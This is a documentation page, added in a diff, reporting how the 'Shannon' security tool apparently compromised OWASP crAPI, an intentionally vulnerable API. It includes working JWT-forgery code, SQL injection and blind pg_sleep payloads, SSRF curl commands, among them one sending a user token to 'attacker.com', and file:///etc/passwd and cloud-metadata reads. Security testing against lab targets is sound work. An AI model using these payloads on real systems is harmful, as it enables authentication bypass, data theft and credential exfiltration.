@@ -1,0 +1,360 @@
+---
+title: OWASP crAPI report
+description: Security assessment of OWASP crAPI with over 15 critical vulnerabilities
+---
+
+Shannon identified **over 15 critical and high-severity vulnerabilities** achieving full application compromise in [OWASP crAPI](https://github.com/OWASP/crAPI), a modern intentionally vulnerable API designed to benchmark against the OWASP API Security Top 10.
+
+<Note>
+  The full report is available in the Shannon repository at `sample-reports/shannon-report-crapi.md`
+</Note>
+
+## Executive summary
+
+- **Target:** OWASP crAPI (Completely Ridiculous API)
+- **Assessment scope:** OWASP API Security Top 10
+- **Total vulnerabilities:** Over 15 critical/high findings
+- **Overall impact:** Full database compromise, authentication bypass, SSRF exploitation
+
+## Key accomplishments
+
+<CardGroup cols={2}>
+  <Card title="Advanced JWT attacks" icon="key">
+    Algorithm confusion, alg:none, and weak key (kid) injection
+  </Card>
+  <Card title="Database compromise" icon="database">
+    SQL injection extracting user credentials from PostgreSQL
+  </Card>
+  <Card title="Critical SSRF" icon="network-wired">
+    Internal auth token forwarding to external services
+  </Card>
+  <Card title="Zero false positives" icon="circle-check">
+    Correctly validated robust XSS defenses
+  </Card>
+</CardGroup>
+
+## Critical findings
+
+### Authentication vulnerabilities (Critical)
+
+<Accordion title="JWT algorithm confusion attack">
+  **Location:** JWT validation in authentication middleware  
+  **Severity:** Critical  
+  **Impact:** Complete authentication bypass
+
+  **Vulnerability:** Server accepts symmetric algorithm (HS256) when expecting asymmetric (RS256)
+
+  **Exploit:**
+  ```python
+  import jwt
+  import requests
+
+  # Extract RS256 public key from server
+  public_key = requests.get('http://crapi.local/jwks.json').json()['keys'][0]
+
+  # Forge token using public key as HMAC secret
+  forged_token = jwt.encode(
+      {'user_id': 1, 'role': 'admin'},
+      public_key,
+      algorithm='HS256'
+  )
+  ```
+
+  **Proof of impact:**  
+  Successfully bypassed authentication and accessed admin endpoints using forged JWT tokens.
+
+  **Technical details:**  
+  The JWT library doesn't enforce algorithm type matching, allowing attackers to sign tokens with the public key using HMAC.
+</Accordion>
+
+<Accordion title="JWT alg:none bypass">
+  **Location:** JWT validation middleware  
+  **Severity:** Critical  
+  **Impact:** Universal authentication bypass
+
+  **Exploit:**
+  ```bash
+  # Create unsigned JWT with alg:none
+  TOKEN=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0).\
+  $(echo -n '{"user_id":1,"role":"admin"}' | base64 -w0).
+
+  curl http://crapi.local/api/admin/users \
+    -H "Authorization: Bearer $TOKEN"
+  ```
+
+  **Proof of impact:**  
+  Accessed all protected endpoints without any signature verification.
+</Accordion>
+
+<Accordion title="JWT weak key injection (kid)">
+  **Location:** JWT key ID (kid) parameter  
+  **Severity:** Critical  
+  **Impact:** Arbitrary file read, authentication bypass
+
+  **Exploit:**
+  ```json
+  {
+    "alg": "HS256",
+    "kid": "../../dev/null"
+  }
+  ```
+
+  By pointing `kid` to `/dev/null` (empty file), the HMAC secret becomes an empty string, enabling trivial token forgery.
+
+  **Proof of impact:**  
+  Forged admin tokens using empty secret and accessed all admin functionality.
+</Accordion>
+
+### SQL injection (Critical)
+
+<Accordion title="PostgreSQL injection in search">
+  **Location:** `GET /api/shop/orders?search={query}`  
+  **Severity:** Critical  
+  **Impact:** Complete database compromise
+
+  **Exploit:**
+  ```bash
+  # Extract user credentials
+  curl "http://crapi.local/api/shop/orders?search=x'%20UNION%20SELECT%20id,email,password,null,null%20FROM%20users--"
+
+  # Extract database schema
+  curl "http://crapi.local/api/shop/orders?search=x'%20UNION%20SELECT%20table_name,column_name,null,null,null%20FROM%20information_schema.columns--"
+  ```
+
+  **Proof of impact:**
+  Successfully extracted:
+  - All user emails and bcrypt password hashes
+  - Credit card information (last 4 digits, expiration)
+  - Order history and personal data
+  - Complete database schema
+  - PostgreSQL version and configuration
+</Accordion>
+
+<Accordion title="Blind SQL injection in vehicle lookup">
+  **Location:** `GET /api/mechanic/vehicle/{vin}`  
+  **Severity:** High  
+  **Impact:** Database enumeration via boolean-based blind injection
+
+  **Exploit using time-based technique:**
+  ```bash
+  # Confirm injection with sleep
+  curl "http://crapi.local/api/mechanic/vehicle/ABC123'%20AND%20pg_sleep(5)--"
+  # Response delayed 5 seconds
+
+  # Exfiltrate data bit by bit
+  curl "http://crapi.local/api/mechanic/vehicle/ABC123'%20AND%20substring(password,1,1)='a'--"
+  ```
+
+  **Proof of impact:**  
+  Enumerated admin password character by character using boolean queries.
+</Accordion>
+
+### SSRF vulnerabilities (Critical)
+
+<Accordion title="SSRF with internal token forwarding">
+  **Location:** `POST /api/share/report` (report sharing endpoint)  
+  **Severity:** Critical  
+  **Impact:** Internal service access, credential exfiltration
+
+  **Vulnerability:** URL validation bypass + automatic authentication header forwarding
+
+  **Exploit:**
+  ```bash
+  # Exfiltrate user's JWT to attacker server
+  curl -X POST http://crapi.local/api/share/report \
+    -H "Authorization: Bearer $USER_TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"report_url":"http://attacker.com/collect"}'
+  ```
+
+  **Proof of impact:**
+  - Forwarded user authentication tokens to external attacker server
+  - Accessed internal services (Redis, PostgreSQL, maintenance API)
+  - Retrieved AWS metadata (IAM credentials) via `http://169.254.169.254/`
+  - Scanned internal network and identified additional services
+
+  **Technical details:**  
+  The sharing endpoint forwards the user's `Authorization` header when fetching the report URL, enabling token exfiltration.
+</Accordion>
+
+<Accordion title="SSRF via profile picture upload">
+  **Location:** `POST /api/user/picture` (URL-based upload)  
+  **Severity:** High  
+  **Impact:** Internal network reconnaissance, file read
+
+  **Exploit:**
+  ```bash
+  # Access internal services
+  curl -X POST http://crapi.local/api/user/picture \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"picture_url":"http://internal-api:8080/admin"}'
+
+  # File protocol for local file read
+  curl -X POST http://crapi.local/api/user/picture \
+    -d '{"picture_url":"file:///etc/passwd"}'
+  ```
+
+  **Proof of impact:**  
+  - Accessed internal API endpoints
+  - Read local configuration files
+  - Fingerprinted internal services and versions
+</Accordion>
+
+### Authorization vulnerabilities (High)
+
+<Accordion title="IDOR - Access any user's orders">
+  **Location:** `GET /api/shop/orders/{order_id}`  
+  **Severity:** High  
+  **Impact:** Horizontal privilege escalation
+
+  Sequential order IDs with no ownership validation enable accessing:
+  - Other users' order details
+  - Shipping addresses
+  - Payment information (partial)
+  - Order history and patterns
+</Accordion>
+
+<Accordion title="IDOR - Modify any vehicle">
+  **Location:** `PUT /api/mechanic/vehicle/{vin}`  
+  **Severity:** High  
+  **Impact:** Data manipulation, fraud
+
+  No authorization check on VIN parameter allows:
+  - Modifying other users' vehicle information
+  - Changing service records
+  - Altering mileage and maintenance history
+</Accordion>
+
+<Accordion title="BFLA - Access admin endpoints">
+  **Location:** `/api/admin/*` endpoints  
+  **Severity:** Critical  
+  **Impact:** Admin functionality accessible to regular users
+
+  Missing function-level authorization checks enable regular users to:
+  - List all users via `/api/admin/users`
+  - Modify user roles via `/api/admin/users/{id}/role`
+  - Access system statistics and logs
+  - Trigger administrative operations
+</Accordion>
+
+### Additional vulnerabilities
+
+<AccordionGroup>
+  <Accordion title="Mass assignment in user profile">
+    **Location:** `PUT /api/user/profile`  
+    **Severity:** High  
+    **Impact:** Privilege escalation
+
+    Unfiltered input allows setting privileged fields:
+    ```json
+    {"role": "admin", "balance": 999999}
+    ```
+  </Accordion>
+
+  <Accordion title="Weak password policy">
+    **Location:** Registration and password change  
+    **Severity:** Medium  
+    **Impact:** Account compromise via brute force
+
+    No password complexity requirements:
+    - Accepts passwords as short as 4 characters
+    - No special character requirements
+    - No uppercase/lowercase requirements
+    - No password history checks
+  </Accordion>
+
+  <Accordion title="Excessive data exposure">
+    **Location:** All API endpoints  
+    **Severity:** Medium  
+    **Impact:** Information disclosure
+
+    API responses leak sensitive data:
+    - Internal database IDs
+    - Unnecessary user fields (created_at, updated_at)
+    - Stack traces in error messages
+    - PostgreSQL query details
+  </Accordion>
+
+  <Accordion title="Missing rate limiting">
+    **Location:** All endpoints  
+    **Severity:** Medium  
+    **Impact:** Brute force, DoS
+
+    No rate limiting on:
+    - Login endpoint (credential stuffing)
+    - Password reset (account enumeration)
+    - API endpoints (resource exhaustion)
+  </Accordion>
+</AccordionGroup>
+
+## XSS testing results
+
+<Info>
+  **Accurate security validation:** Shannon correctly confirmed crAPI's robust XSS defenses:
+  
+  - React automatic escaping in JSX
+  - Content Security Policy with nonce-based inline scripts
+  - DOMPurify sanitization on rich text fields
+  
+  Shannon reported **zero false positives**, demonstrating high accuracy in distinguishing secure from vulnerable code.
+</Info>
+
+## Impact summary
+
+<Warning>
+  **Combined impact:** Complete application compromise with external attack surface:
+  
+  1. **Authentication bypass** via multiple JWT attacks (algorithm confusion, alg:none, kid injection)
+  2. **Complete database access** via SQL injection with credential exfiltration
+  3. **Internal network compromise** via SSRF with token forwarding
+  4. **Admin access** via broken function-level authorization
+  5. **Horizontal privilege escalation** via IDOR across orders and vehicles
+  6. **Cloud metadata access** via SSRF to AWS instance metadata
+</Warning>
+
+## Statistics
+
+| Metric | Value |
+|--------|-------|
+| Total vulnerabilities | 15+ |
+| Critical severity | 8 |
+| High severity | 6 |
+| Medium severity | 3 |
+| Runtime | 1.4 hours |
+| API cost | ~$52 USD |
+| False positives | 0 |
+| JWT attacks | 3 variants |
+
+## Key security lessons
+
+<CardGroup cols={2}>
+  <Card title="JWT validation is complex" icon="key">
+    Multiple attack vectors: algorithm confusion, alg:none, kid injection
+  </Card>
+  <Card title="SSRF + auth forwarding = critical" icon="network-wired">
+    Combining SSRF with automatic header forwarding enables token exfiltration
+  </Card>
+  <Card title="PostgreSQL-specific attacks" icon="database">
+    pg_sleep for blind injection, information_schema for enumeration
+  </Card>
+  <Card title="Function-level authz matters" icon="shield">
+    Role-based access control must be enforced at every endpoint
+  </Card>
+</CardGroup>
+
+## Related resources
+
+<CardGroup cols={2}>
+  <Card title="Full report" icon="file-pdf" href="https://github.com/KeygraphHQ/shannon/blob/main/sample-reports/shannon-report-crapi.md">
+    View complete report in GitHub
+  </Card>
+  <Card title="OWASP crAPI" icon="github" href="https://github.com/OWASP/crAPI">
+    Official crAPI repository
+  </Card>
+  <Card title="Test your API" icon="rocket" href="/quickstart">
+    Run Shannon against your API
+  </Card>
+  <Card title="JWT security" icon="lock" href="/coverage/vulnerability-types#authentication">
+    Learn about JWT attack vectors
+  </Card>
+</CardGroup>
